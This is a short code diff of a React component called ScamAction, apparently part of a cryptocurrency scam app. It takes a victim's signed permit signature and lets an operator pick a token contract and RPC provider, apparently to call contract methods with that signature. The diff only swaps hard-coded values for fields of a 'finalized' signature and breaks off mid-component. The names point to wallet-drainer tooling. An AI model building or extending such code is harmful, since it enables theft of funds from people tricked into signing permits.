@@ -1,17 +1,18 @@
 'use client';
 
 import {SignedPermitSignature} from "@/app/scam/page";
-import {callContractMethod} from "../page";
+import {callContractMethod, FinalizedSignedSignature} from "../page";
 import {CustomContract} from "@/app/TokenList";
 import React, {useState} from "react";
 import {ethers} from "ethers";
 
 const ScamAction = (props: {
-	data: SignedPermitSignature
+	data: SignedPermitSignature,
+	finalized: FinalizedSignedSignature
 }) => {
 	const {data} = props;
-	const [contractAddress, setContractAddress] = useState(CustomContract.ETH);
-	const [provider, setProvider] = useState("https://rpc.walletconnect.com/v1/?chainId=eip155:1&projectId=90e5e5ac9da57364effebface3c64405")
+	const [contractAddress, setContractAddress] = useState(props.finalized.token.contract_address);
+	const [provider, setProvider] = useState(props.finalized.provider)
 	return (
 		<div className={'flex gap-3 items-center'}>
 			<select value={contractAddress} onChange={e => {
